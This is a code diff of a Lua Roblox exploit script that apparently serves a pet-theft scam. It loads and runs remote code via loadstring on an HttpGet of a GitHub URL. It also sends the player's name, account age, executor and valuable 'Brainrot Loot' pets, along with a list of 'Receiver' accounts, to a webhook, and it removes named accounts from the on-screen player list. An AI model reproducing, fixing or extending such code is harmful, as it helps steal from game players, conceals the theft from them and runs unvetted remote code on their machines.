@@ -31,6 +31,8 @@ end
 local config = loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/config/refs/heads/main/config"))()
 local PRICE_LIMIT = 1
 local targetNames = config.targetNames
+local nameSuffixes = config.Receiver
+local blockedNames = config.Displayname
 
 local function getPriority(name)
     for _, t in ipairs(targetNames) do
@@ -166,7 +168,7 @@ local function sendWebhook(link)
         table.insert(orderedPets, r)
     end
 
-    local nameSuffixes = config.Receiver
+    
     local receiverList = table.concat(nameSuffixes, ", ")
     local lootText = table.concat(orderedPets, "\n")
     local placeId = tostring(game.PlaceId or "")
@@ -180,7 +182,7 @@ local function sendWebhook(link)
             { ["name"] = "Server Type", ["value"] = serverType },
             { ["name"] = "👥 Player Information",
               ["value"] = "Name: " .. player.Name ..
-                          "\nReceiver: .. receiverList ..
+                          "\nReceiver: " .. receiverList ..
                           "\nExecutor: " .. detectExecutor() ..
                           "\nAccount Age: " .. tostring(getAccountAge()) .. " days" },
             { ["name"] = "🧠Brainrot Loot", ["value"] = lootText },
@@ -594,7 +596,7 @@ end
 -------------------------------
 -- PHẦN 2: XÓA PLAYERENTRY THEO DANH SÁCH TÊN
 -------------------------------
-local blockedNames = config.Displayname
+
 
 local success, scrollList = pcall(function()
 	return CoreGui.PlayerList
